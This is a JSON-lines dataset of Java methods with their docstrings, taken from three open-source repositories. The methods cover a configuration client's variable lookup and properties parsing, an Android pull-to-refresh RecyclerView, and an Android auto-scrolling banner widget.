{"docstring": "/**\n * Resolves the specified variable. This implementation will try to extract\n * a variable prefix from the given variable name (the first colon (':') is\n * used as prefix separator). It then passes the name of the variable with\n * the prefix stripped to the lookup object registered for this prefix. If\n * no prefix can be found or if the associated lookup object cannot resolve\n * this variable, the default lookup object will be used.\n *\n * @param var the name of the variable whose value is to be looked up\n * @return the value of this variable or <b>null</b> if it cannot be\n * resolved\n */\n", "func_signal": "@Override\npublic String lookup(String var)", "code": "{\n    if (var == null) {\n        return null;\n    }\n\n    int prefixPos = var.indexOf(PREFIX_SEPARATOR);\n    if (prefixPos >= 0) {\n        String prefix = var.substring(0, prefixPos);\n        String name = var.substring(prefixPos + 1);\n        String value = fetchLookupForPrefix(prefix).lookup(name);\n        if (value == null && getParentInterpolator() != null) {\n            value = getParentInterpolator().lookup(name);\n        }\n        if (value != null) {\n            return value;\n        }\n    }\n    String value = fetchNoPrefixLookup().lookup(var);\n    if (value == null && getParentInterpolator() != null) {\n        value = getParentInterpolator().lookup(var);\n    }\n    return value;\n}", "path": "super-diamond-client\\src\\main\\java\\com\\github\\diamond\\client\\config\\ConfigurationInterpolator.java", "repo_name": "melin/super-diamond", "stars": 549, "license": "None", "language": "java", "size": 2287}
{"docstring": "/**\n * Reads a property line. Returns null if Stream is at EOF. Concatenates\n * lines ending with \"\\\". Skips lines beginning with \"#\" or \"!\" and empty\n * lines. The return value is a property definition (\n * <code>&lt;name&gt;</code> = <code>&lt;value&gt;</code>)\n */\n", "func_signal": "public String readProperty() throws IOException", "code": "{\n    commentLines.clear();\n    StringBuilder buffer = new StringBuilder();\n\n    while (true) {\n        String line = readLine();\n        if (line == null) {\n            // EOF\n            return null;\n        }\n\n        if (isCommentLine(line)) {\n            commentLines.add(line);\n            continue;\n        }\n\n        line = line.trim();\n\n        if (checkCombineLines(line)) {\n            line = line.substring(0, line.length() - 1);\n            buffer.append(line);\n        } else {\n            buffer.append(line);\n            break;\n        }\n    }\n    return buffer.toString();\n}", "path": "super-diamond-client\\src\\main\\java\\com\\github\\diamond\\client\\config\\PropertiesReader.java", "repo_name": "melin/super-diamond", "stars": 549, "license": "None", "language": "java", "size": 2287}
{"docstring": "/**\n * Parse a property line and return the key, the value, and the separator in\n * an array.\n */\n", "func_signal": "private static String[] doParseProperty(String line)", "code": "{\n    Matcher matcher = PROPERTY_PATTERN.matcher(line);\n\n    String[] result = {\"\", \"\", \"\"};\n\n    if (matcher.matches()) {\n        result[0] = matcher.group(IDX_KEY).trim();\n        result[1] = matcher.group(IDX_VALUE).trim();\n        result[2] = matcher.group(IDX_SEPARATOR);\n    }\n\n    return result;\n}", "path": "super-diamond-client\\src\\main\\java\\com\\github\\diamond\\client\\config\\PropertiesReader.java", "repo_name": "melin/super-diamond", "stars": 549, "license": "None", "language": "java", "size": 2287}
{"docstring": "/**\n * \u5907\u4efd\u6570\u636e\u5230\u672c\u5730.\n */\n", "func_signal": "public static void saveData(String projCode, String profile, String data, String localFilePath)", "code": "{\n    File file = null;\n    if (StringUtils.isBlank(localFilePath)) {\n        String userHome = System.getProperty(\"user.home\");\n        String dirStr = userHome + File.separator + \".superdiamond\" + File.separator + projCode + File.separator + profile;\n        File dir = new File(dirStr);\n        if (!dir.exists()) {\n            dir.mkdirs();\n        }\n\n        file = new File(dirStr + File.separator + \"data.properties\");\n    } else if (StringUtils.contains(localFilePath, \"classpath\") && localFilePath.indexOf(\"classpath\") == 0) {\n        String str = FileUtils.class.getResource(\"/\").getPath() + localFilePath.substring(localFilePath.lastIndexOf(\":\") + 1);\n        file = new File(str);\n    } else {\n        int start = localFilePath.lastIndexOf(\".properties\");\n        String str = null;\n        if (start != -1) {\n            str = localFilePath.substring(start);\n        } else {\n            //todo \u629b\u5f02\u5e38\n        }\n        if (str != null && \".properties\".equals(str)) {\n            file = new File(localFilePath);\n            if (!file.getAbsoluteFile().getParentFile().exists()) {\n                file.getAbsoluteFile().getParentFile().mkdirs();\n            }\n        } else {\n            //todo \u629b\u5f02\u5e38\n        }\n    }\n    try {\n        FileUtils.writeStringToFile(file, data, Charset.forName(\"UTF-8\"));\n    } catch (IOException e) {\n        e.printStackTrace();\n    }\n}", "path": "super-diamond-client\\src\\main\\java\\com\\github\\diamond\\client\\util\\FileUtils.java", "repo_name": "melin/super-diamond", "stars": 549, "license": "None", "language": "java", "size": 2287}
{"docstring": "/**\n * \u5bf9\u4e8c\u8fdb\u5236\u6570\u636e\u8fdb\u884cmd5\n *\n * @param data\n * @return md5 byte[16]\n */\n", "func_signal": "public byte[] hash(byte[] data)", "code": "{\n    opLock.lock();\n    try {\n        byte[] bt = messageDigest.digest(data);\n        if (null == bt || bt.length != 16) {\n            throw new IllegalArgumentException(\"md5 need\");\n        }\n        return bt;\n    } finally {\n        opLock.unlock();\n    }\n}", "path": "super-diamond-server\\src\\main\\java\\com\\github\\diamond\\utils\\MD5.java", "repo_name": "melin/super-diamond", "stars": 549, "license": "None", "language": "java", "size": 2287}
{"docstring": "/**\n * \u6dfb\u52a0\u5934\u90e8\u89c6\u56fe\uff0c\u53ef\u4ee5\u6dfb\u52a0\u591a\u4e2a\n *\n * @param view \u5934\u90e8\u89c6\u56fe\n */\n", "func_signal": "public void addHeaderView(View view)", "code": "{\n    mHeaderViews.add(view);\n    if (mAdapter != null) {\n        if (!(mAdapter instanceof WrapAdapter)) {\n            mAdapter = new WrapAdapter(mHeaderViews, mFootViews, mAdapter);\n        }\n    }\n}", "path": "AnimRefreshRecyclerView\\src\\main\\java\\com\\sch\\rfview\\AnimRFRecyclerView.java", "repo_name": "shichaohui/AnimRefreshRecyclerView", "stars": 579, "license": "None", "language": "java", "size": 10774}
{"docstring": "/**\n * \u52a0\u8f7d\u66f4\u591a\u6570\u636e\u5b8c\u6210\u540e\u8c03\u7528\uff0c\u5fc5\u987b\u5728UI\u7ebf\u7a0b\u4e2d\n */\n", "func_signal": "public void loadMoreComplate()", "code": "{\n    isLoadingData = false;\n    if (mFootViews.size() > 0) {\n        mFootViews.get(0).setVisibility(GONE);\n    }\n}", "path": "AnimRefreshRecyclerView\\src\\main\\java\\com\\sch\\rfview\\AnimRFRecyclerView.java", "repo_name": "shichaohui/AnimRefreshRecyclerView", "stars": 579, "license": "None", "language": "java", "size": 10774}
{"docstring": "/**\n * \u8bbe\u7f6e\u989c\u8272\n *\n * @param progressColor \u8fdb\u5ea6\u989c\u8272\n * @param bgColor       \u80cc\u666f\u989c\u8272\n */\n", "func_signal": "public void setColor(int progressColor, int bgColor)", "code": "{\n    hollowPaint.setColor(progressColor);\n    paint.setColor(bgColor);\n}", "path": "AnimRefreshRecyclerView\\src\\main\\java\\com\\sch\\rfview\\AnimView.java", "repo_name": "shichaohui/AnimRefreshRecyclerView", "stars": 579, "license": "None", "language": "java", "size": 10774}
{"docstring": "/**\n * \u6dfb\u52a0\u6570\u636e\n */\n", "func_signal": "private void addData()", "code": "{\n    for (int i = 0; i < 13; i++) {\n        datas.add(\"\u6761\u76ee  \" + (datas.size() + 1));\n    }\n}", "path": "app\\src\\main\\java\\com\\sch\\rfview\\example\\fragment\\LinearFragment.java", "repo_name": "shichaohui/AnimRefreshRecyclerView", "stars": 579, "license": "None", "language": "java", "size": 10774}
{"docstring": "/**\n * \u7ed9{@link AnimRFGridLayoutManager}\u9644\u52a0\u5934\u90e8\u811a\u90e8\u548c\u6ed1\u52a8\u8fc7\u5ea6\u76d1\u542c\n *\n * @param manager {@link AnimRFGridLayoutManager}\n */\n", "func_signal": "private void layoutGridAttach(final AnimRFGridLayoutManager manager)", "code": "{\n    // GridView\u5e03\u5c40\n    manager.setOverScrollListener(mOverScrollListener);\n    manager.setSpanSizeLookup(new GridLayoutManager.SpanSizeLookup() {\n        @Override\n        public int getSpanSize(int position) {\n            return ((WrapAdapter) mAdapter).isHeader(position) ||\n                    ((WrapAdapter) mAdapter).isFooter(position) ? manager.getSpanCount() : 1;\n        }\n    });\n    requestLayout();\n}", "path": "AnimRefreshRecyclerView\\src\\main\\java\\com\\sch\\rfview\\AnimRFRecyclerView.java", "repo_name": "shichaohui/AnimRefreshRecyclerView", "stars": 579, "license": "None", "language": "java", "size": 10774}
{"docstring": "/**\n * \u66f4\u65b0\u5934\u90e8\u7684\u900f\u660e\u5ea6\n */\n", "func_signal": "private void updateHeaderAlpha()", "code": "{\n    // \u5f53\u524d\u62c9\u4f38\u9ad8\u5ea6\n    int scallHeight = headerImage.getLayoutParams().height - headerImageHeight;\n    if (scallHeight > 0) {\n        mHandler.obtainMessage(1, scallHeight, 0, null).sendToTarget();\n    }\n}", "path": "AnimRefreshRecyclerView\\src\\main\\java\\com\\sch\\rfview\\AnimRFRecyclerView.java", "repo_name": "shichaohui/AnimRefreshRecyclerView", "stars": 579, "license": "None", "language": "java", "size": 10774}
{"docstring": "/**\n * \u6839\u636e\u624b\u673a\u7684\u5206\u8fa8\u7387\u4ece px(\u50cf\u7d20) \u7684\u5355\u4f4d \u8f6c\u6210\u4e3a dp\n *\n * @param context\n * @param pxValue \u8981\u8f6c\u6362\u7684px\u503c\n */\n", "func_signal": "public static int px2dip(Context context, float pxValue)", "code": "{\n    final float scale = context.getResources().getDisplayMetrics().density;\n    return (int) (pxValue / scale + 0.5f);\n}", "path": "app\\src\\main\\java\\com\\sch\\rfview\\example\\utils\\DimensionConvert.java", "repo_name": "shichaohui/AnimRefreshRecyclerView", "stars": 579, "license": "None", "language": "java", "size": 10774}
{"docstring": "/**\n * \u6839\u636e\u624b\u673a\u7684\u5206\u8fa8\u7387\u4ece dp \u7684\u5355\u4f4d \u8f6c\u6210\u4e3a px(\u50cf\u7d20)\n *\n * @param context\n * @param dpValue \u8981\u8f6c\u6362\u7684dp\u503c\n */\n", "func_signal": "public static int dip2px(Context context, float dpValue)", "code": "{\n    final float scale = context.getResources().getDisplayMetrics().density;\n    return (int) (dpValue * scale + 0.5f);\n}", "path": "app\\src\\main\\java\\com\\sch\\rfview\\example\\utils\\DimensionConvert.java", "repo_name": "shichaohui/AnimRefreshRecyclerView", "stars": 579, "license": "None", "language": "java", "size": 10774}
{"docstring": "/**\n * \u6839\u636e\u624b\u673a\u7684\u5206\u8fa8\u7387\u4ece dp \u7684\u5355\u4f4d \u8f6c\u6210\u4e3a px(\u50cf\u7d20)\n *\n * @param context\n * @param dpValue \u8981\u8f6c\u6362\u7684dp\u503c\n */\n", "func_signal": "public static int dip2px(Context context, float dpValue)", "code": "{\n    final float scale = context.getResources().getDisplayMetrics().density;\n    return (int) (dpValue * scale + 0.5f);\n}", "path": "AnimRefreshRecyclerView\\src\\main\\java\\com\\sch\\rfview\\AnimView.java", "repo_name": "shichaohui/AnimRefreshRecyclerView", "stars": 579, "license": "None", "language": "java", "size": 10774}
{"docstring": "/**\n * @param context\n * @param hasFooter \u662f\u5426\u6709\u811a\u90e8\n */\n", "func_signal": "public DividerGridItemDecoration(Context context, boolean hasFooter)", "code": "{\n    this.hasFooter = hasFooter;\n    final TypedArray a = context.obtainStyledAttributes(ATTRS);\n    mDivider = a.getDrawable(0);\n    a.recycle();\n}", "path": "AnimRefreshRecyclerView\\src\\main\\java\\com\\sch\\rfview\\decoration\\DividerGridItemDecoration.java", "repo_name": "shichaohui/AnimRefreshRecyclerView", "stars": 579, "license": "None", "language": "java", "size": 10774}
{"docstring": "/**\n * \u5237\u65b0\u6570\u636e\u5b8c\u6210\u540e\u8c03\u7528\uff0c\u5fc5\u987b\u5728UI\u7ebf\u7a0b\u4e2d\n */\n", "func_signal": "public void refreshComplate()", "code": "{\n    isLoadingData = false;\n    rfAnimView.setVisibility(GONE);\n    // \u5185\u5bb9\u4e0d\u80fd\u5145\u6ee1\u4e00\u9875\u65f6\uff0c\u5237\u65b0\u5b8c\u81ea\u52a8\u83b7\u53d6\u4e0b\u4e00\u9875\n    smoothScrollBy(0, 1);\n}", "path": "AnimRefreshRecyclerView\\src\\main\\java\\com\\sch\\rfview\\AnimRFRecyclerView.java", "repo_name": "shichaohui/AnimRefreshRecyclerView", "stars": 579, "license": "None", "language": "java", "size": 10774}
{"docstring": "/**\n * \u8bbe\u7f6e\u5934\u90e8\u62c9\u4f38\u56fe\u7247\n *\n * @param headerImage \u5934\u90e8\u4e2d\u7684\u80cc\u666fImageView\n */\n", "func_signal": "public void setHeaderImage(ImageView headerImage)", "code": "{\n    this.headerImage = headerImage;\n    headerImageHeight = AnimRFRecyclerView.this.headerImage.getHeight();\n    // \u9632\u6b62\u7b2c\u4e00\u6b21\u62c9\u4f38\u7684\u65f6\u5019headerImage.getLayoutParams().height = 0\n    if (headerImageHeight <= 0) {\n        headerImageHeight = AnimRFRecyclerView.this.headerImage.getLayoutParams().height;\n    } else {\n        this.headerImage.getLayoutParams().height = headerImageHeight;\n    }\n    headerImageMaxHeight = (int) (headerImageHeight * scaleRatio);\n}", "path": "AnimRefreshRecyclerView\\src\\main\\java\\com\\sch\\rfview\\AnimRFRecyclerView.java", "repo_name": "shichaohui/AnimRefreshRecyclerView", "stars": 579, "license": "None", "language": "java", "size": 10774}
{"docstring": "/**\n * \u7ed9StaggeredGridLayoutManager\u9644\u52a0\u5934\u90e8\u548c\u6ed1\u52a8\u8fc7\u5ea6\u76d1\u542c\n *\n * @param manager {@link AnimRFStaggeredGridLayoutManager}\n */\n", "func_signal": "private void layoutStaggeredGridHeadAttach(AnimRFStaggeredGridLayoutManager manager)", "code": "{\n    manager.setOverScrollListener(mOverScrollListener);\n    // \u4ece\u524d\u5411\u540e\u67e5\u627eHeader\u5e76\u8bbe\u7f6e\u4e3a\u5145\u6ee1\u4e00\u884c\n    View view;\n    for (int i = 0; i < mAdapter.getItemCount(); i++) {\n        if (((WrapAdapter) mAdapter).isHeader(i)) {\n            view = getChildAt(i);\n            ((StaggeredGridLayoutManager.LayoutParams) view.getLayoutParams())\n                    .setFullSpan(true);\n            view.requestLayout();\n        } else {\n            break;\n        }\n    }\n}", "path": "AnimRefreshRecyclerView\\src\\main\\java\\com\\sch\\rfview\\AnimRFRecyclerView.java", "repo_name": "shichaohui/AnimRefreshRecyclerView", "stars": 579, "license": "None", "language": "java", "size": 10774}
{"docstring": "/**\n * \u6dfb\u52a0\u6570\u636e\n */\n", "func_signal": "private void addData()", "code": "{\n    if (datas == null) {\n        datas = new ArrayList<>();\n        heights = new ArrayList<>();\n    }\n    for (int i = 0; i < 20; i++) {\n        datas.add(\"\u6761\u76ee  \" + (datas.size() + 1));\n        calHeight();\n    }\n}", "path": "app\\src\\main\\java\\com\\sch\\rfview\\example\\fragment\\StaggeredGridFragment.java", "repo_name": "shichaohui/AnimRefreshRecyclerView", "stars": 579, "license": "None", "language": "java", "size": 10774}
{"docstring": "/**\n * \u6dfb\u52a0\u811a\u90e8\u89c6\u56fe\uff0c\u6b64\u89c6\u56fe\u53ea\u80fd\u6dfb\u52a0\u4e00\u4e2a\uff0c\u6dfb\u52a0\u591a\u4e2a\u65f6\uff0c\u9ed8\u8ba4\u6700\u540e\u6dfb\u52a0\u7684\u4e00\u4e2a\u3002\n *\n * @param view \u5e95\u90e8\u89c6\u56fe\n */\n", "func_signal": "public void addFootView(final View view)", "code": "{\n    mFootViews.clear();\n    mFootViews.add(view);\n    if (mAdapter != null) {\n        if (!(mAdapter instanceof WrapAdapter)) {\n            mAdapter = new WrapAdapter(mHeaderViews, mFootViews, mAdapter);\n        }\n    }\n}", "path": "AnimRefreshRecyclerView\\src\\main\\java\\com\\sch\\rfview\\AnimRFRecyclerView.java", "repo_name": "shichaohui/AnimRefreshRecyclerView", "stars": 579, "license": "None", "language": "java", "size": 10774}
{"docstring": "// \u5237\u65b0\n", "func_signal": "private void refresh()", "code": "{\n    isLoadingData = true;\n    mLoadDataListener.onRefresh();\n    if (rfAnimView == null) {\n        // \u8bbe\u7f6e\u5237\u65b0\u52a8\u753b\n        rfAnimView = new AnimView(mContext);\n        rfAnimView.setColor(progressColor, bgColor);\n        RelativeLayout.LayoutParams params = new RelativeLayout.LayoutParams(\n                AnimView.dip2px(mContext, 33), AnimView.dip2px(mContext, 50));\n        params.addRule(RelativeLayout.CENTER_HORIZONTAL);\n        params.setMargins(0, AnimView.dip2px(mContext, 5), 0, 0);\n        ((ViewGroup) mHeaderViews.get(0)).addView(rfAnimView, params);\n    } else {\n        rfAnimView.setVisibility(VISIBLE);\n    }\n}", "path": "AnimRefreshRecyclerView\\src\\main\\java\\com\\sch\\rfview\\AnimRFRecyclerView.java", "repo_name": "shichaohui/AnimRefreshRecyclerView", "stars": 579, "license": "None", "language": "java", "size": 10774}
{"docstring": "/**\n * \u9690\u85cf{@link #headerImage}\n */\n", "func_signal": "private void headerImageHint()", "code": "{\n    ValueAnimator animator = ValueAnimator.ofInt(\n            headerImage.getLayoutParams().height, headerImageHeight);\n    animator.setDuration(durationMillis);\n    animator.addUpdateListener(new ValueAnimator.AnimatorUpdateListener() {\n        @Override\n        public void onAnimationUpdate(ValueAnimator animation) {\n            headerImage.getLayoutParams().height = (int) animation.getAnimatedValue();\n            updateHeaderAlpha();\n            headerImage.requestLayout();\n        }\n    });\n    animator.start();\n}", "path": "AnimRefreshRecyclerView\\src\\main\\java\\com\\sch\\rfview\\AnimRFRecyclerView.java", "repo_name": "shichaohui/AnimRefreshRecyclerView", "stars": 579, "license": "None", "language": "java", "size": 10774}
{"docstring": "/**\n * \u8bbe\u7f6e\u662f\u5426\u6267\u884c\u5237\u65b0\n *\n * @param isRefrsh\n */\n", "func_signal": "public void setRefresh(boolean isRefrsh)", "code": "{\n    if (isRefrsh) {\n        refresh();\n    } else {\n        refreshComplate();\n    }\n}", "path": "AnimRefreshRecyclerView\\src\\main\\java\\com\\sch\\rfview\\AnimRFRecyclerView.java", "repo_name": "shichaohui/AnimRefreshRecyclerView", "stars": 579, "license": "None", "language": "java", "size": 10774}
{"docstring": "/**\n * @param color1\n * @param color2\n */\n", "func_signal": "public void setColor(int color1, int color2)", "code": "{\n    mPaint.setColor(color2);\n    mPaintText.setColor(color1);\n    colorBg = color1;\n}", "path": "AnimRefreshRecyclerView\\src\\main\\java\\com\\sch\\rfview\\AnimImageView.java", "repo_name": "shichaohui/AnimRefreshRecyclerView", "stars": 579, "license": "None", "language": "java", "size": 10774}
{"docstring": "/**\n * \u7ed9{@link StaggeredGridLayoutManager}\u9644\u52a0\u811a\u90e8\n *\n * @param view \u5e95\u90e8\u89c6\u56fe\n */\n", "func_signal": "private void layoutStaggeredGridFootAttach(View view)", "code": "{\n    // Footer\u8bbe\u7f6e\u4e3a\u5145\u6ee1\u4e00\u884c\n    ((StaggeredGridLayoutManager.LayoutParams) view.getLayoutParams())\n            .setFullSpan(true);\n    // view.requestLayout();\n}", "path": "AnimRefreshRecyclerView\\src\\main\\java\\com\\sch\\rfview\\AnimRFRecyclerView.java", "repo_name": "shichaohui/AnimRefreshRecyclerView", "stars": 579, "license": "None", "language": "java", "size": 10774}
{"docstring": "/** \u6eda\u52a8\u5ef6\u65f6,\u9ed8\u8ba45\u79d2 */\n", "func_signal": "public T setDelay(long delay)", "code": "{\n    this.mDelay = delay;\n    return (T) this;\n}", "path": "FlycoBanner_Lib\\src\\main\\java\\com\\flyco\\banner\\widget\\Banner\\base\\BaseBanner.java", "repo_name": "H07000223/FlycoBanner_Master", "stars": 529, "license": "mit", "language": "java", "size": 12977}
{"docstring": "/** \u8bbe\u7f6e\u6eda\u52a8\u901f\u7387 */\n", "func_signal": "private void setScrollSpeed()", "code": "{\n    try {\n        Field mScroller = ViewPager.class.getDeclaredField(\"mScroller\");\n        mScroller.setAccessible(true);\n        AccelerateDecelerateInterpolator interpolator = new AccelerateDecelerateInterpolator();\n        FixedSpeedScroller myScroller = new FixedSpeedScroller(mContext, interpolator, mScrollSpeed);\n        mScroller.set(mViewPager, myScroller);\n    } catch (Exception e) {\n        e.printStackTrace();\n    }\n}", "path": "FlycoBanner_Lib\\src\\main\\java\\com\\flyco\\banner\\widget\\Banner\\base\\BaseBanner.java", "repo_name": "H07000223/FlycoBanner_Master", "stars": 529, "license": "mit", "language": "java", "size": 12977}
{"docstring": "/** \u8bbe\u7f6e\u662f\u5426\u663e\u793a\u663e\u793a\u5668,\u9ed8\u8ba4true */\n", "func_signal": "public T setIndicatorShow(boolean isIndicatorShow)", "code": "{\n    mLlIndicatorContainer.setVisibility(isIndicatorShow ? VISIBLE : INVISIBLE);\n    return (T) this;\n}", "path": "FlycoBanner_Lib\\src\\main\\java\\com\\flyco\\banner\\widget\\Banner\\base\\BaseBanner.java", "repo_name": "H07000223/FlycoBanner_Master", "stars": 529, "license": "mit", "language": "java", "size": 12977}
{"docstring": "/** \u6eda\u52a8\u5230\u4e0b\u4e00\u4e2aitem */\n", "func_signal": "private void scrollToNextItem(int position)", "code": "{\n    position++;\n    mViewPager.setCurrentItem(position);\n}", "path": "FlycoBanner_Lib\\src\\main\\java\\com\\flyco\\banner\\widget\\Banner\\base\\BaseBanner.java", "repo_name": "H07000223/FlycoBanner_Master", "stars": 529, "license": "mit", "language": "java", "size": 12977}
{"docstring": "/**\n * helper function which may be used when implementing FragmentPagerAdapter\n *\n * @param position\n * @param count\n * @return (position-1)%count\n */\n", "func_signal": "public static int toRealPosition(int position, int count)", "code": "{\n    position = position - 1;\n    if (position < 0) {\n        position += count;\n    } else {\n        position = position % count;\n    }\n    return position;\n}", "path": "FlycoBanner_Lib\\src\\main\\java\\com\\flyco\\banner\\widget\\LoopViewPager\\LoopViewPager.java", "repo_name": "H07000223/FlycoBanner_Master", "stars": 529, "license": "mit", "language": "java", "size": 12977}
{"docstring": "/** \u8bbe\u7f6e\u6700\u540e\u4e00\u6761item\u662f\u5426\u663e\u793a\u80cc\u666f\u6761,\u9ed8\u8ba4true */\n", "func_signal": "public T setBarShowWhenLast(boolean isBarShowWhenLast)", "code": "{\n    this.mIsBarShowWhenLast = isBarShowWhenLast;\n    return (T) this;\n}", "path": "FlycoBanner_Lib\\src\\main\\java\\com\\flyco\\banner\\widget\\Banner\\base\\BaseBanner.java", "repo_name": "H07000223/FlycoBanner_Master", "stars": 529, "license": "mit", "language": "java", "size": 12977}
{"docstring": "/** \u6eda\u52a8\u95f4\u9694,\u9ed8\u8ba45\u79d2 */\n", "func_signal": "public T setPeriod(long period)", "code": "{\n    this.mPeriod = period;\n    return (T) this;\n}", "path": "FlycoBanner_Lib\\src\\main\\java\\com\\flyco\\banner\\widget\\Banner\\base\\BaseBanner.java", "repo_name": "H07000223/FlycoBanner_Master", "stars": 529, "license": "mit", "language": "java", "size": 12977}
{"docstring": "/** \u505c\u6b62\u6eda\u52a8(for LoopViewPager) */\n", "func_signal": "public void pauseScroll()", "code": "{\n    if (mStse != null) {\n        mStse.shutdown();\n        mStse = null;\n    }\n    Log.d(TAG, this.getClass().getSimpleName() + \"--->pauseScroll()\");\n\n    mIsAutoScrolling = false;\n}", "path": "FlycoBanner_Lib\\src\\main\\java\\com\\flyco\\banner\\widget\\Banner\\base\\BaseBanner.java", "repo_name": "H07000223/FlycoBanner_Master", "stars": 529, "license": "mit", "language": "java", "size": 12977}
{"docstring": "/** \u8bbe\u7f6e\u663e\u793a\u5668\u9ad8\u5ea6,\u5355\u4f4ddp,\u9ed8\u8ba46dp */\n", "func_signal": "public T setIndicatorHeight(float indicatorHeight)", "code": "{\n    this.mIndicatorHeight = dp2px(indicatorHeight);\n    return (T) this;\n}", "path": "FlycoBanner_Lib\\src\\main\\java\\com\\flyco\\banner\\widget\\Banner\\BaseIndicatorBanner.java", "repo_name": "H07000223/FlycoBanner_Master", "stars": 529, "license": "mit", "language": "java", "size": 12977}
{"docstring": "/** \u8bbe\u7f6e\u5e95\u90e8\u80cc\u666f\u6761padding,\u5355\u4f4ddp */\n", "func_signal": "public T barPadding(float left, float top, float right, float bottom)", "code": "{\n    mLlBottomBar.setPadding(dp2px(left), dp2px(top), dp2px(right), dp2px(bottom));\n    return (T) this;\n}", "path": "FlycoBanner_Lib\\src\\main\\java\\com\\flyco\\banner\\widget\\Banner\\base\\BaseBanner.java", "repo_name": "H07000223/FlycoBanner_Master", "stars": 529, "license": "mit", "language": "java", "size": 12977}
{"docstring": "/** \u8bbe\u7f6e\u663e\u793a\u5668\u9009\u4e2d\u4ee5\u53ca\u672a\u9009\u4e2d\u8d44\u6e90(for STYLE_DRAWABLE_RESOURCE) */\n", "func_signal": "public T setIndicatorSelectorRes(int unselectRes, int selectRes)", "code": "{\n    try {\n        if (mIndicatorStyle == STYLE_DRAWABLE_RESOURCE) {\n            if (selectRes != 0) {\n                this.mSelectDrawable = getResources().getDrawable(selectRes);\n            }\n            if (unselectRes != 0) {\n                this.mUnSelectDrawable = getResources().getDrawable(unselectRes);\n            }\n        }\n    } catch (Resources.NotFoundException e) {\n        e.printStackTrace();\n    }\n    return (T) this;\n}", "path": "FlycoBanner_Lib\\src\\main\\java\\com\\flyco\\banner\\widget\\Banner\\BaseIndicatorBanner.java", "repo_name": "H07000223/FlycoBanner_Master", "stars": 529, "license": "mit", "language": "java", "size": 12977}
{"docstring": "/** \u8bbe\u7f6e\u663e\u793a\u5668\u672a\u9009\u4e2d\u52a8\u753b */\n", "func_signal": "public T setUnselectAnimClass(Class<? extends BaseAnimator> unselectAnimClass)", "code": "{\n    this.mUnselectAnimClass = unselectAnimClass;\n    return (T) this;\n}", "path": "FlycoBanner_Lib\\src\\main\\java\\com\\flyco\\banner\\widget\\Banner\\BaseIndicatorBanner.java", "repo_name": "H07000223/FlycoBanner_Master", "stars": 529, "license": "mit", "language": "java", "size": 12977}
{"docstring": "/** \u5f00\u59cb\u6eda\u52a8 */\n", "func_signal": "public void startScroll()", "code": "{\n    if (mDatas == null) {\n        throw new IllegalStateException(\"Data source is empty,you must setSource() before startScroll()\");\n    }\n\n    if (mDatas.size() > 0 && mCurrentPositon > mDatas.size() - 1) {\n        mCurrentPositon = 0;\n    }\n\n    onTitleSlect(mTvTitle, mCurrentPositon);\n    setViewPager();\n    //create indicator\n    View indicatorViews = onCreateIndicator();\n    if (indicatorViews != null) {\n        mLlIndicatorContainer.removeAllViews();\n        mLlIndicatorContainer.addView(indicatorViews);\n    }\n\n    goOnScroll();\n}", "path": "FlycoBanner_Lib\\src\\main\\java\\com\\flyco\\banner\\widget\\Banner\\base\\BaseBanner.java", "repo_name": "H07000223/FlycoBanner_Master", "stars": 529, "license": "mit", "language": "java", "size": 12977}
{"docstring": "/** \u8bbe\u7f6e\u4e24\u4e2a\u663e\u793a\u5668\u95f4\u8ddd,\u5355\u4f4ddp,\u9ed8\u8ba46dp */\n", "func_signal": "public T setIndicatorGap(float indicatorGap)", "code": "{\n    this.mIndicatorGap = dp2px(indicatorGap);\n    return (T) this;\n}", "path": "FlycoBanner_Lib\\src\\main\\java\\com\\flyco\\banner\\widget\\Banner\\BaseIndicatorBanner.java", "repo_name": "H07000223/FlycoBanner_Master", "stars": 529, "license": "mit", "language": "java", "size": 12977}
{"docstring": "/** \u8bbe\u7f6e\u663e\u793a\u5668\u9009\u4e2d\u989c\u8272(for STYLE_CORNER_RECTANGLE),\u9ed8\u8ba4\"#ffffff\" */\n", "func_signal": "public T setIndicatorSelectColor(int selectColor)", "code": "{\n    this.mSelectColor = selectColor;\n    return (T) this;\n}", "path": "FlycoBanner_Lib\\src\\main\\java\\com\\flyco\\banner\\widget\\Banner\\BaseIndicatorBanner.java", "repo_name": "H07000223/FlycoBanner_Master", "stars": 529, "license": "mit", "language": "java", "size": 12977}
{"docstring": "/** \u8bbe\u7f6e\u663e\u793a\u6837\u5f0f,STYLE_DRAWABLE_RESOURCE or STYLE_CORNER_RECTANGLE */\n", "func_signal": "public T setIndicatorStyle(int indicatorStyle)", "code": "{\n    this.mIndicatorStyle = indicatorStyle;\n    return (T) this;\n}", "path": "FlycoBanner_Lib\\src\\main\\java\\com\\flyco\\banner\\widget\\Banner\\BaseIndicatorBanner.java", "repo_name": "H07000223/FlycoBanner_Master", "stars": 529, "license": "mit", "language": "java", "size": 12977}
{"docstring": "/** \u7ee7\u7eed\u6eda\u52a8(for LoopViewPager) */\n", "func_signal": "public void goOnScroll()", "code": "{\n    if (!isValid()) {\n        return;\n    }\n\n    if (mIsAutoScrolling) {\n        return;\n    }\n    if (isLoopViewPager() && mIsAutoScrollEnable) {\n        pauseScroll();\n        mStse = Executors.newSingleThreadScheduledExecutor();\n        mStse.scheduleAtFixedRate(new Runnable() {\n            @Override\n            public void run() {\n                mHandler.obtainMessage().sendToTarget();\n            }\n        }, mDelay, mPeriod, TimeUnit.SECONDS);\n        mIsAutoScrolling = true;\n        Log.d(TAG, this.getClass().getSimpleName() + \"--->goOnScroll()\");\n    } else {\n        mIsAutoScrolling = false;\n    }\n}", "path": "FlycoBanner_Lib\\src\\main\\java\\com\\flyco\\banner\\widget\\Banner\\base\\BaseBanner.java", "repo_name": "H07000223/FlycoBanner_Master", "stars": 529, "license": "mit", "language": "java", "size": 12977}
{"docstring": "/**\n * If set to true, the boundary views (i.e. first and last) will never be\n * destroyed This may help to prevent \"blinking\" of some views\n *\n * @param flag\n */\n", "func_signal": "public void setBoundaryCaching(boolean flag)", "code": "{\n    mBoundaryCaching = flag;\n    if (mAdapter != null) {\n        mAdapter.setBoundaryCaching(flag);\n    }\n}", "path": "FlycoBanner_Lib\\src\\main\\java\\com\\flyco\\banner\\widget\\LoopViewPager\\LoopViewPager.java", "repo_name": "H07000223/FlycoBanner_Master", "stars": 529, "license": "mit", "language": "java", "size": 12977}
